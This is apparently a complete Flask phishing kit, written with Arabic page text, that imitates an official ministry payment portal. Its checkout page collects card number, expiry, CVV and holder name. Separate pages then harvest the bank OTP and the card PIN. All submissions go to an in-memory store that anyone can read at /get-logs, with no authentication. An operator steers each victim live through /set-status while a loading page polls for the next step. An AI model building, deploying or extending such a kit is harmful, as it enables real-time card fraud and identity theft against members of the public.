import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- الهيدر الرسمي الثابت ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<div style="background:white; padding:15px 25px; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center; font-family:sans-serif;">
    <div style="display:flex; align-items:center; gap:20px; color:#555; font-size:18px;">
        <span style="font-weight:bold; color:#333; cursor:pointer;">EN | دخول</span>
        <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-question-circle"></i>
    </div>
    <div style="display:flex; gap:15px;">
        <div style="background:#b0914f; color:white; padding:10px 15px; border-radius:6px;"><i class="fa fa-bars"></i></div>
        <div style="background:#b0914f; color:white; padding:10px 15px; border-radius:6px;"><i class="fa fa-cog"></i></div>
    </div>
</div>
<div style="background:white; text-align:center; padding:15px 0; border-bottom:2px solid #b0914f;">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; max-width:700px;">
</div>
'''

@app.route('/')
def index():
    return render_template_string(f"<html lang='ar' dir='rtl'><body style='margin:0;'>{MOI_TOP_BAR}<div style='max-width:800px;margin:0 auto;position:relative;'><img src='https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg' style='width:100%;'><button onclick='location.href=\"/search\"' style='position:absolute;top:320px;left:10%;width:80%;height:80px;background:transparent;border:none;cursor:pointer;'></button></div></body></html>")

# --- صفحة الدفع (كبيرة ومنسقة) ---
@app.route('/checkout')
def checkout():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{background:#f4f6f8; font-family:sans-serif; margin:0;}}
        .container{{max-width:700px; margin:30px auto; padding:20px;}}
        .box{{background:white; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.1); padding:40px; position:relative;}}
        .v-header{{background:#b0914f; color:white; padding:20px; border-radius:10px 10px 0 0; text-align:center; margin:-40px -40px 30px -40px; font-size:22px; font-weight:bold;}}
        input, select{{width:100%; padding:18px; margin-bottom:20px; border:1.5px solid #ddd; border-radius:10px; outline:none; font-size:18px; box-sizing:border-box;}}
        .error-border{{border-color:#d32f2f !important; background:#fff8f8 !important;}}
        .btn-pay{{width:100%; padding:22px; background:#b0914f; color:white; border:none; border-radius:10px; font-size:22px; font-weight:bold; cursor:pointer; transition:0.3s;}}
        .btn-pay:hover{{background:#8e743d;}}
        .card-icons-row{{text-align:center; margin-bottom:25px;}}
        .card-icons-row img{{height:35px; opacity:0.3; transition:0.3s; margin:0 10px;}}
        .active-logo{{opacity:1 !important; transform:scale(1.2);}}
    </style></head>
    <body>{MOI_TOP_BAR}
        <div class="container">
            <div class="box">
                <div class="v-header">بوابة الدفع الآمنة الموحدة</div>
                <div class="card-icons-row">
                    <img id="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
                    <img id="master-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
                </div>
                <form action="/submit-card" method="POST" id="payForm">
                    <input name="card" id="card_input" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
                    <div style="display:flex; gap:15px;">
                        <select name="exp_m" required>
                            <option value="">الشهر</option>
                            {% for m in range(1, 13) %}<option>{{"%02d"|format(m)}}</option>{% endfor %}
                        </select>
                        <select name="exp_y" required>
                            <option value="">السنة</option>
                            {% for y in range(2026, 2037) %}<option>{{y}}</option>{% endfor %}
                        </select>
                    </div>
                    <div style="display:flex; gap:15px;">
                        <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                        <input name="holder" placeholder="اسم حامل البطاقة" style="flex:3;" required>
                    </div>
                    <button type="submit" class="btn-pay">دفع الرسوم الآن</button>
                </form>
            </div>
        </div>
        <script>
            const cardInp = document.getElementById('card_input');
            const vLogo = document.getElementById('visa-logo');
            const mLogo = document.getElementById('master-logo');
            cardInp.addEventListener('input', e => {{
                let val = e.target.value.replace(/\\s/g, '');
                vLogo.classList.toggle('active-logo', val.startsWith('4'));
                mLogo.classList.toggle('active-logo', val.startsWith('5'));
                e.target.value = val.replace(/(.{{4}})/g, '$1 ').trim();
            }});
        </script>
    </body></html>
    """)

# --- صفحات OTP و PIN (كبيرة جداً ومالية الصفحة) ---
PAGE_STYLE = """<style>
    body{margin:0; background:#f0f2f5; font-family:sans-serif; display:flex; flex-direction:column; min-height:100vh;}
    .wrapper{flex:1; display:flex; justify-content:center; align-items:center; padding:20px;}
    .modal-full{background:white; width:100%; max-width:600px; padding:60px; border-radius:20px; box-shadow:0 20px 50px rgba(0,0,0,0.15); text-align:center; border-top:8px solid #b0914f;}
    h2{font-size:32px; color:#333; margin-bottom:10px;}
    p{font-size:18px; color:#666; margin-bottom:30px;}
    input{width:100%; padding:25px; font-size:45px; text-align:center; border:2px solid #eee; border-radius:15px; margin-bottom:30px; letter-spacing:10px; font-weight:bold; outline:none; transition:0.3s;}
    input:focus{border-color:#b0914f; box-shadow:0 0 15px rgba(176,145,79,0.2);}
    .btn-large{width:100%; padding:25px; background:#b0914f; color:white; border:none; border-radius:15px; font-size:24px; font-weight:bold; cursor:pointer;}
</style>"""

@app.route('/otp')
def otp():
    return render_template_string(f"<html><head>{PAGE_STYLE}</head><body>{MOI_TOP_BAR}<div class='wrapper'><div class='modal-full'><h2>تأكيد الرمز المشفّر</h2><p>يرجى إدخال رمز التحقق (OTP) المرسل إلى رقم هاتفك المسجل لدى البنك</p><form action='/submit-card' method='POST'><input name='otp' placeholder='000000' maxlength='6' required autofocus><button class='btn-large'>تأكيد واعتماد الدفع</button></form></div></div></body></html>")

@app.route('/pin')
def pin():
    return render_template_string(f"<html><head>{PAGE_STYLE}</head><body>{MOI_TOP_BAR}<div class='wrapper'><div class='modal-full'><h2>الرقم السري للبطاقة</h2><p>يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام لإتمام العملية</p><form action='/submit-card' method='POST'><input name='pin' type='password' placeholder='****' maxlength='4' required autofocus><button class='btn-large'>إرسال البيانات</button></form></div></div></body></html>")

# --- الباكيند ومعالجة البيانات ---
@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    else: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; db['msg'] = request.args.get('msg', ''); return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

WAIT_JS = """<script>setInterval(()=>{fetch('/check-status').then(r=>r.json()).then(d=>{if(d.status==='go_otp')location.href='/otp';if(d.status==='go_pin')location.href='/pin';if(d.status==='error_card'){alert(d.msg);location.href='/checkout';}});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;background:#f8f9fa;"><div style="border:6px solid #f3f3f3;border-top:6px solid #b0914f;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:auto;"></div><h2 style="margin-top:20px;">جاري معالجة طلبك بأمان...</h2><style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style></body>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
